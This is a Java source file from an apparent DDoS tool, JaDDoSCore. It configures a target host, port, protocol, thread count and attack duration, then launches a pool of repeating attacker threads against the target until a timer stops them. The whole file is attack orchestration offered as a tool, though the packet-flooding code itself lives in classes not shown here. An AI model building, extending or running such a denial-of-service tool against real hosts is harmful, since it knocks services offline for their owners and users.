/***
 * Copyright (c) 2021 Shehan Dhaleesha
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 * 
 */

package com.jaddos.core;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.management.InvalidAttributeValueException;

import org.apache.log4j.Logger;
import com.jaddos.util.JaDDoSConstant;
import com.jaddos.util.TimeChecker;

/**
 * Core implementation of the DoS attack
 * 
 * @author ShehanD
 *
 */
public class JaDDoSCore {

	/** Logger instance */
	private Logger logger = Logger.getLogger(JaDDoSCore.class);

	/** To validate the time. */
	private TimeChecker timeChecker;

	/** Pattern for the DDOS. */
	private JaDDoSPattern jaDDoSPattern;
	
	/**
	 * This is is the thread pool for all the DDOS-Attack threads. Every attacking
	 * thread will be saved in there.
	 */
	private ScheduledExecutorService threadPool;

	/** Decides if the threads should stop. true = threads should stop */
	private static boolean stopThread = false;


	/** Constructor */
	public JaDDoSCore() {

	}

	/**
	 * Create DDoS Pattern
	 * 
	 * @param host
	 * @param port
	 * @param protocol
	 */
	public void createDDoSPattern(String host, int port, String protocol) {
		createDDoSPattern(host, port, protocol, JaDDoSConstant.DEFAULT_ATTACK_THREAD_COUNT);
	}

	/**
	 * Create DDoS Pattern
	 * 
	 * @param host
	 * @param port
	 * @param protocol
	 * @param threads
	 */
	public void createDDoSPattern(String host, int port, String protocol, int threads) {
		createDDoSPattern(host, port, protocol, threads, JaDDoSConstant.DEFAULT_TIMEOUT_IN_MILLISECONDS);
	}

	/**
	 * Create DDoS Pattern
	 * 
	 * @param host
	 * @param port
	 * @param protocol
	 * @param threads
	 * @param socketTimeout
	 */
	public void createDDoSPattern(String host, int port, String protocol, int threads, int socketTimeout) {
		createDDoSPattern(host, port, protocol, threads, socketTimeout, JaDDoSConstant.DEFAULT_TIMEOUT_IN_MILLISECONDS,
				1, 0, 0, "Default Message");
	}

	/**
	 * Create DDoS Pattern
	 * 
	 * @param host
	 * @param port
	 * @param protocol
	 * @param threads
	 * @param socketTimeout
	 * @param threadTimeout
	 * @param hours
	 * @param minutes
	 * @param seconds
	 * @param message
	 */
	public void createDDoSPattern(String host, int port, String protocol, int threads, int socketTimeout,
			int threadTimeout, int hours, int minutes, int seconds, String message) {
		jaDDoSPattern = new JaDDoSPattern();

		jaDDoSPattern.setHost(host);
		jaDDoSPattern.setPort(port);
		jaDDoSPattern.setProtocol(protocol);
		jaDDoSPattern.setThreads(threads);
		jaDDoSPattern.setSocketTimeout(socketTimeout);
		jaDDoSPattern.setTimeout(threadTimeout);
		jaDDoSPattern.setHours(hours);
		jaDDoSPattern.setMinutes(minutes);
		jaDDoSPattern.setSeconds(seconds);
		jaDDoSPattern.setMessage(message);
	}

	/**
	 * Method to configure the attack vector
	 * 
	 * @throws Exception
	 */
	private void configAttack() throws Exception {
		stopThread = false;

		if (jaDDoSPattern != null) {
			if (!jaDDoSPattern.getHost().isEmpty() && jaDDoSPattern.getHost() != null) {
				int duration = (jaDDoSPattern.getHours() * 3600) + (jaDDoSPattern.getMinutes() * 60)
						+ (jaDDoSPattern.getSeconds());

				if (duration > 0) {
					logger.info("Attack initiated!");
					threadPool = Executors.newScheduledThreadPool(jaDDoSPattern.getThreads());
					timeChecker = new TimeChecker(stopThread, duration);
					timeChecker.start();

					for (int i = 0; i < jaDDoSPattern.getThreads(); i++) {
						// add a new attacker thread to the thread pool
						threadPool.scheduleWithFixedDelay(JaDDoSFactory.createDDOS(jaDDoSPattern), 1,
								jaDDoSPattern.getTimeout(), TimeUnit.MILLISECONDS);
					}

				} else {
					throw new InvalidAttributeValueException("Time must be greater than 0 seconds!");
				}
			} else {
				throw new NullPointerException("Host is empty!");
			}
		} else {
			throw new NullPointerException("Trying to access a null object");
		}
	}

	/**
	 * Publicly accessible method to call the attack
	 * 
	 * @throws Exception
	 */
	public void beginAttack() throws Exception {
		configAttack();

		if (TimeChecker.interrupted()) {
			stopThread = true;
			if (threadPool != null) {
				threadPool.shutdownNow();
			}
			threadPool = null;
			logger.info("Attack is stoped!");
		}
	}
}
